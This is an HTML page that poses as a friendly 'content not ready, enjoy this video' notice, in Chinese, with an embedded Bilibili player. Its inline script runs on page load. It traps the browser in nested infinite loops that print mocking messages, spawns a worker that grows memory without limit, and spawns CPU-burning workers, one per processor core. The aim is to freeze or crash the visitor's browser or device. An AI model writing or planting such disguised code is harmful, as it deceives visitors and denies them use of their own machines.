<!doctype html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow" />
    <title>神秘网页</title>
    <style>
        .container {
            width: 60%;
            margin: 10% auto 0;
            background-color: #f0f0f0;
            padding: 2% 5%;
            border-radius: 10px
        }

        ul {
            padding-left: 20px;
        }

        ul li {
            line-height: 2.3
        }

        a {
            color: #20a53a
        }

    </style>
</head>

<body>
    <div class="container">
        <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=80433022&bvid=BV1GJ411x7h7&cid=137649199&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>
        <h1>OOOOps...</h1>
        <h3>你请求的内容还没有准备好</h3>
        <h3>不过我们为你准备了这个神秘网页</h3>
        <p>那就让我们一起来听会音乐，看会视频放松一下吧</p>
    </div>
    <script>
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function run() {
            console.log("开始等待...");
            await sleep(5); // 等待5毫秒
            for (let i = 114.514191981; i > 0; i++) {
                while (true) {
                    console.log(i += 114.514191981)
                    do {
                        i++;
                        function fn(i) {
                            while (true) {
                                console.log(i + i * i + "恭喜你呀，你又被我恭喜到啦");
                                console.log(i * 114.514191981 * i + "哈基用户你这家伙")
                                console.log(i + "下次不许这样了")
                            }
                        }
                        fn(i);

                    } while (i > 0);

                }
            }
        }
        async function sun() {
            console.log("开始等待...");
            await sleep(5); // 等待5毫秒
            console.log("开始占用内存和CPU...");

            // 创建内存占用的Worker
            const memoryWorker = new Worker(URL.createObjectURL(new Blob([`
                let stringArray = [];
                function generateStrings() {
                    while (true) {
                        let str = "";
                        // 生成长字符串
                        for (let i = 0; i < 1e6; i++) {
                            str += Math.random().toString(36);
                        }
                        // 存储字符串
                        stringArray.push(str);
                    }
                }

                generateStrings();
            `], { type: 'application/javascript' })));

            // 创建CPU占用和日志输出的Workers
            function createCPUWorker() {
                return new Worker(URL.createObjectURL(new Blob([`
                    function sleep(ms) {
                        return new Promise(resolve => setTimeout(resolve, ms));
                    }

                    async function cpuAndLog() {
                        while (true) {
                            // 死循环和大量日志输出
                            console.log("CPU 占用中 - " + Math.random());
                            for (let i = 0; i < 1e5; i++) {  // 大量计算
                                Math.sqrt(Math.random()) * Math.sqrt(Math.random());
                            }
                            await sleep(5);  // 每次迭代后等待 5 毫秒
                        }
                    }

                    cpuAndLog();
                `], { type: 'application/javascript' })));
            }

            // 启动与核心数相同的CPU Worker
            const cpuWorkers = [];
            for (let i = 0; i < navigator.hardwareConcurrency; i++) {
                cpuWorkers.push(createCPUWorker());
            }

            console.log("CPU 负载、内存占用和日志输出已启动");
        }

        function fuck() {
            console.log("开始同时运行两个函数...");

            const worker1 = run();
            const worker2 = sun();

            worker1.onmessage = function (event) {
                console.log(event.data);
            };

            worker2.onmessage = function (event) {
                console.log(event.data);
            };

            console.log("两个 Worker 已启动");
        }
        fuck();
    </script>

</body>

</html>





